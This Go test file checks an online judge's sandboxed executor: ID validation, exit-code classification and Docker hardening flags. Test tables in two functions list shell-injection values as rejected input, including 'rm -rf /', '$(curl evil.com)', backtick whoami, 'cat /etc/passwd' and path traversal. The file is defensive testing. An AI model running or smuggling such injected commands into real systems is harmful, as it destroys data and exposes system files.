package executor

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"testing"

	"github.com/tsuniforge/judge/internal/config"
	"github.com/tsuniforge/judge/internal/models"
)

// TestHelperProcess is used to simulate specific process exit codes (e.g. exit code 137 for OOM/MLE)
func TestHelperProcess(t *testing.T) {
	if os.Getenv("GO_WANT_HELPER_PROCESS") != "1" {
		return
	}
	exitCode := 0
	if codeStr := os.Getenv("TEST_HELPER_EXIT_CODE"); codeStr != "" {
		if c, err := strconv.Atoi(codeStr); err == nil {
			exitCode = c
		}
	}
	os.Exit(exitCode)
}

func TestIsValidID(t *testing.T) {
	tests := []struct {
		name     string
		id       string
		expected bool
	}{
		// Valid IDs
		{"valid standard uuid", "c8a7e029-450f-4f81-81d3-3f1362e920d3", true},
		{"valid alphanumeric", "submission12345", true},
		{"valid with underscore and dash", "sub_test-01", true},
		{"valid uppercase and lowercase", "AbCdEf-123_XYZ", true},
		{"valid single char", "a", true},

		// Malicious & Invalid IDs (Shell Injection vectors)
		{"empty string", "", false},
		{"semicolon injection rm", "tc; rm -rf /;", false},
		{"command substitution curl", "test$(curl http://evil.com)", false},
		{"backtick substitution", "test`whoami`", false},
		{"pipe command", "tc|cat /etc/passwd", false},
		{"logical AND command", "test&&rm -rf /", false},
		{"redirect output", "tc>output.txt", false},
		{"redirect input", "tc<input.txt", false},
		{"path traversal with slashes", "../../etc/passwd", false},
		{"absolute path", "/tmp/evil", false},
		{"whitespace space", "test case 1", false},
		{"newline injection", "test\nid", false},
		{"tab injection", "test\tid", false},
		{"special symbols", "test@#$%^&*()", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsValidID(tt.id)
			if got != tt.expected {
				t.Errorf("IsValidID(%q) = %v; want %v", tt.id, got, tt.expected)
			}
		})
	}
}

func TestClassifyError(t *testing.T) {
	t.Run("nil error returns empty string", func(t *testing.T) {
		if got := ClassifyError(nil, ""); got != "" {
			t.Errorf("ClassifyError(nil, \"\") = %q; want empty string", got)
		}
	})

	t.Run("exit code 137 returns MLE via ExitError", func(t *testing.T) {
		cmd := exec.Command(os.Args[0], "-test.run=TestHelperProcess", "--")
		cmd.Env = append(os.Environ(), "GO_WANT_HELPER_PROCESS=1", "TEST_HELPER_EXIT_CODE=137")
		err := cmd.Run()
		if err == nil {
			t.Fatalf("expected command to exit with code 137, got nil error")
		}

		exitErr, ok := err.(*exec.ExitError)
		if !ok {
			t.Fatalf("expected *exec.ExitError, got %T: %v", err, err)
		}
		if exitErr.ExitCode() != 137 {
			t.Fatalf("expected exit code 137, got %d", exitErr.ExitCode())
		}

		got := ClassifyError(err, "")
		if got != "MLE" {
			t.Errorf("ClassifyError(exitCode=137, \"\") = %q; want \"MLE\"", got)
		}
	})

	t.Run("exit code 1 returns RE", func(t *testing.T) {
		cmd := exec.Command(os.Args[0], "-test.run=TestHelperProcess", "--")
		cmd.Env = append(os.Environ(), "GO_WANT_HELPER_PROCESS=1", "TEST_HELPER_EXIT_CODE=1")
		err := cmd.Run()
		if err == nil {
			t.Fatalf("expected command to exit with code 1, got nil error")
		}

		got := ClassifyError(err, "standard error output")
		if got != "RE" {
			t.Errorf("ClassifyError(exitCode=1, \"standard error output\") = %q; want \"RE\"", got)
		}
	})

	t.Run("stderr containing OOM returns MLE", func(t *testing.T) {
		err := errors.New("exit status 1")
		got := ClassifyError(err, "Out of memory: Killed process 123 (solution), OOM killer invoked")
		if got != "MLE" {
			t.Errorf("ClassifyError(err, stderr_with_OOM) = %q; want \"MLE\"", got)
		}
	})

	t.Run("signal: killed error string returns MLE", func(t *testing.T) {
		err := errors.New("signal: killed")
		got := ClassifyError(err, "")
		if got != "MLE" {
			t.Errorf("ClassifyError(signal_killed, \"\") = %q; want \"MLE\"", got)
		}
	})

	t.Run("general runtime error returns RE", func(t *testing.T) {
		err := errors.New("exit status 2")
		got := ClassifyError(err, "ZeroDivisionError: division by zero")
		if got != "RE" {
			t.Errorf("ClassifyError(general_err, stderr) = %q; want \"RE\"", got)
		}
	})
}

func findFlagValue(args []string, flag string) (string, bool) {
	for i := 0; i < len(args); i++ {
		if args[i] == flag && i+1 < len(args) {
			return args[i+1], true
		}
	}
	return "", false
}

func containsFlag(args []string, flag string) bool {
	for _, arg := range args {
		if arg == flag {
			return true
		}
	}
	return false
}

func TestBuildCompileArgs(t *testing.T) {
	cfg := &config.Config{
		CompilePids:    128,
		SeccompProfile: "/etc/seccomp.json",
	}

	execInstance, err := New(cfg)
	if err != nil {
		t.Fatalf("New() failed: %v", err)
	}

	langCfg := config.LanguageConfig{
		Name:       "C++ 17",
		Extension:  ".cpp",
		CompileCmd: "g++ -std=c++17 -O2 -o /tmp/solution /tmp/solution.cpp",
		RunCmd:     "/tmp/solution",
		Image:      "tsuniforge/sandbox-cpp:latest",
	}

	args := execInstance.BuildCompileArgs("/tmp/tsuniforge/sub-123", "compile-sub-123", langCfg)

	// Check --pids-limit
	pidsVal, found := findFlagValue(args, "--pids-limit")
	if !found {
		t.Errorf("BuildCompileArgs missing --pids-limit")
	} else if pidsVal != "128" {
		t.Errorf("BuildCompileArgs --pids-limit = %q; want \"128\"", pidsVal)
	}

	// Check --security-opt no-new-privileges
	foundNoNewPriv := false
	for i := 0; i < len(args)-1; i++ {
		if args[i] == "--security-opt" && args[i+1] == "no-new-privileges" {
			foundNoNewPriv = true
			break
		}
	}
	if !foundNoNewPriv {
		t.Errorf("BuildCompileArgs missing --security-opt no-new-privileges")
	}

	// Check seccomp profile
	foundSeccomp := false
	for i := 0; i < len(args)-1; i++ {
		if args[i] == "--security-opt" && args[i+1] == "seccomp=/etc/seccomp.json" {
			foundSeccomp = true
			break
		}
	}
	if !foundSeccomp {
		t.Errorf("BuildCompileArgs missing seccomp security-opt")
	}

	// Check --memory 512m
	memVal, found := findFlagValue(args, "--memory")
	if !found || memVal != "512m" {
		t.Errorf("BuildCompileArgs --memory = %q; want \"512m\"", memVal)
	}

	// Check --network none
	netVal, found := findFlagValue(args, "--network")
	if !found || netVal != "none" {
		t.Errorf("BuildCompileArgs --network = %q; want \"none\"", netVal)
	}

	// Check container name
	nameVal, found := findFlagValue(args, "--name")
	if !found || nameVal != "compile-sub-123" {
		t.Errorf("BuildCompileArgs --name = %q; want \"compile-sub-123\"", nameVal)
	}
}

func TestBuildRunArgs(t *testing.T) {
	cfg := &config.Config{
		MaxPids:        64,
		TmpfsSize:      "50m",
		SeccompProfile: "/etc/seccomp.json",
	}

	execInstance, err := New(cfg)
	if err != nil {
		t.Fatalf("New() failed: %v", err)
	}

	langCfg := config.LanguageConfig{
		Name:       "C++ 17",
		Extension:  ".cpp",
		CompileCmd: "g++ -std=c++17 -O2 -o /tmp/solution /tmp/solution.cpp",
		RunCmd:     "/tmp/solution",
		Image:      "tsuniforge/sandbox-cpp:latest",
	}

	memLimitMB := 256
	args := execInstance.BuildRunArgs("/tmp/tsuniforge/sub-123", "run-sub-123-tc1", langCfg, memLimitMB)

	// 1. Check --pids-limit
	pidsVal, found := findFlagValue(args, "--pids-limit")
	if !found {
		t.Errorf("BuildRunArgs missing --pids-limit")
	} else if pidsVal != "64" {
		t.Errorf("BuildRunArgs --pids-limit = %q; want \"64\"", pidsVal)
	}

	// 2. Check --memory-swap equals --memory (prevents host swap thrashing)
	memVal, foundMem := findFlagValue(args, "--memory")
	swapVal, foundSwap := findFlagValue(args, "--memory-swap")
	if !foundMem || memVal != "256m" {
		t.Errorf("BuildRunArgs --memory = %q; want \"256m\"", memVal)
	}
	if !foundSwap || swapVal != "256m" {
		t.Errorf("BuildRunArgs --memory-swap = %q; want \"256m\"", swapVal)
	}

	// 3. Check --read-only
	if !containsFlag(args, "--read-only") {
		t.Errorf("BuildRunArgs missing --read-only flag")
	}

	// 4. Check --tmpfs
	tmpfsVal, foundTmpfs := findFlagValue(args, "--tmpfs")
	if !foundTmpfs {
		t.Errorf("BuildRunArgs missing --tmpfs flag")
	} else if !strings.Contains(tmpfsVal, "size=50m") {
		t.Errorf("BuildRunArgs --tmpfs = %q; expected to contain \"size=50m\"", tmpfsVal)
	}

	// 5. Check --security-opt no-new-privileges
	foundNoNewPriv := false
	for i := 0; i < len(args)-1; i++ {
		if args[i] == "--security-opt" && args[i+1] == "no-new-privileges" {
			foundNoNewPriv = true
			break
		}
	}
	if !foundNoNewPriv {
		t.Errorf("BuildRunArgs missing --security-opt no-new-privileges")
	}

	// 6. Check direct invocation without shell wrapping
	if containsFlag(args, "sh") || containsFlag(args, "-c") {
		t.Errorf("BuildRunArgs should not use shell wrapping ('sh', '-c'), args: %v", args)
	}

	// Verify command parts are appended directly
	lastArg := args[len(args)-1]
	if lastArg != "/tmp/solution" {
		t.Errorf("BuildRunArgs expected last argument to be /tmp/solution, got %q", lastArg)
	}
}

// TestAdversarialMountConflict tests that -v and --tmpfs mounts do not collide on the same destination path
func TestAdversarialMountConflict(t *testing.T) {
	cfg := &config.Config{
		MaxPids:   64,
		TmpfsSize: "50m",
	}
	execInstance, _ := New(cfg)
	langCfg := config.LanguageConfig{
		Name:   "C++ 17",
		RunCmd: "/tmp/solution",
		Image:  "tsuniforge/sandbox-cpp:latest",
	}

	args := execInstance.BuildRunArgs("/tmp/tsuniforge/sub-123", "run-sub-123", langCfg, 256)

	vVal, foundV := findFlagValue(args, "-v")
	tmpfsVal, foundTmpfs := findFlagValue(args, "--tmpfs")

	if !foundV {
		t.Fatalf("BuildRunArgs missing -v mount")
	}
	if !foundTmpfs {
		t.Fatalf("BuildRunArgs missing --tmpfs mount")
	}

	// Verify -v mount targets /tmp as read-only
	if vVal != "/tmp/tsuniforge/sub-123:/tmp:ro" {
		t.Errorf("BuildRunArgs -v mount = %q; want \"/tmp/tsuniforge/sub-123:/tmp:ro\"", vVal)
	}

	// Verify --tmpfs targets /scratch without conflicting with /tmp
	vTarget := ""
	parts := strings.Split(vVal, ":")
	if len(parts) >= 2 {
		vTarget = parts[1]
	}

	tmpfsTarget := ""
	tParts := strings.Split(tmpfsVal, ":")
	if len(tParts) >= 1 {
		tmpfsTarget = tParts[0]
	}

	if vTarget == tmpfsTarget {
		t.Errorf("CRITICAL MOUNT COLLISION: -v targets %q and --tmpfs targets %q; must target distinct directories", vTarget, tmpfsTarget)
	}

	if tmpfsTarget != "/scratch" {
		t.Errorf("BuildRunArgs --tmpfs target = %q; want \"/scratch\"", tmpfsTarget)
	}

	// Verify noexec is NOT present on the directory containing executables (/tmp)
	if strings.Contains(vVal, "noexec") {
		t.Errorf("BuildRunArgs -v mount unexpectedly has noexec flag: %s", vVal)
	}
}

func TestBuildCompileArgsMountRw(t *testing.T) {
	cfg := &config.Config{
		CompilePids: 128,
	}
	execInstance, _ := New(cfg)
	langCfg := config.LanguageConfig{
		Name:       "C++ 17",
		Extension:  ".cpp",
		CompileCmd: "g++ -std=c++17 -O2 -o /tmp/solution /tmp/solution.cpp",
		RunCmd:     "/tmp/solution",
		Image:      "tsuniforge/sandbox-cpp:latest",
	}

	args := execInstance.BuildCompileArgs("/tmp/tsuniforge/sub-123", "compile-sub-123", langCfg)

	vVal, foundV := findFlagValue(args, "-v")
	if !foundV {
		t.Fatalf("BuildCompileArgs missing -v flag")
	}
	if vVal != "/tmp/tsuniforge/sub-123:/tmp:rw" {
		t.Errorf("BuildCompileArgs -v = %q; want \"/tmp/tsuniforge/sub-123:/tmp:rw\"", vVal)
	}
}

func TestSourceCodeFilenameCasing(t *testing.T) {
	cases := []struct {
		language  string
		extension string
		wantName  string
	}{
		{"java", ".java", "Solution.java"},
		{"cpp", ".cpp", "solution.cpp"},
		{"python", ".py", "solution.py"},
	}

	for _, tc := range cases {
		t.Run(tc.language, func(t *testing.T) {
			sourceFileName := "solution" + tc.extension
			if tc.language == "java" {
				sourceFileName = "Solution.java"
			}
			if sourceFileName != tc.wantName {
				t.Errorf("For language %s, got filename %q, want %q", tc.language, sourceFileName, tc.wantName)
			}
		})
	}
}

func TestExecuteRejectsInvalidIDs(t *testing.T) {
	cfg := &config.Config{
		Languages: map[string]config.LanguageConfig{
			"python": {RunCmd: "python3 /tmp/solution.py"},
		},
	}
	execInstance, err := New(cfg)
	if err != nil {
		t.Fatalf("New() failed: %v", err)
	}

	t.Run("malicious submission ID rejected upfront", func(t *testing.T) {
		badSubmissions := []string{
			"sub; rm -rf /",
			"sub$(curl evil.com)",
			"sub`whoami`",
			"../../etc/passwd",
			"/tmp/evil",
			"sub 123",
			"",
		}

		for _, badID := range badSubmissions {
			job := models.SubmissionJob{
				SubmissionID: badID,
				Language:     "python",
				TestCases:    []models.TestCase{{ID: "tc-1"}},
			}
			result, err := execInstance.Execute(context.Background(), job)
			if err == nil {
				t.Errorf("expected error for malicious submission ID %q, got nil error", badID)
			}
			if result != nil {
				t.Errorf("expected nil result for rejected submission ID %q, got %+v", badID, result)
			}
			if err != nil && !strings.Contains(err.Error(), "invalid submission ID") {
				t.Errorf("expected 'invalid submission ID' in error message for %q, got %q", badID, err.Error())
			}
		}
	})

	t.Run("malicious testcase ID rejected upfront", func(t *testing.T) {
		badTestCases := []string{
			"tc; rm -rf /",
			"tc$(curl evil.com)",
			"tc`whoami`",
			"../../tc_secret",
			"tc|cat /etc/passwd",
			"tc 1",
			"",
		}

		for _, badID := range badTestCases {
			job := models.SubmissionJob{
				SubmissionID: "valid-sub-12345",
				Language:     "python",
				TestCases:    []models.TestCase{{ID: badID}},
			}
			result, err := execInstance.Execute(context.Background(), job)
			if err == nil {
				t.Errorf("expected error for malicious test case ID %q, got nil error", badID)
			}
			if result != nil {
				t.Errorf("expected nil result for rejected test case ID %q, got %+v", badID, result)
			}
			if err != nil && !strings.Contains(err.Error(), "invalid test case ID") {
				t.Errorf("expected 'invalid test case ID' in error message for %q, got %q", badID, err.Error())
			}
		}
	})
}

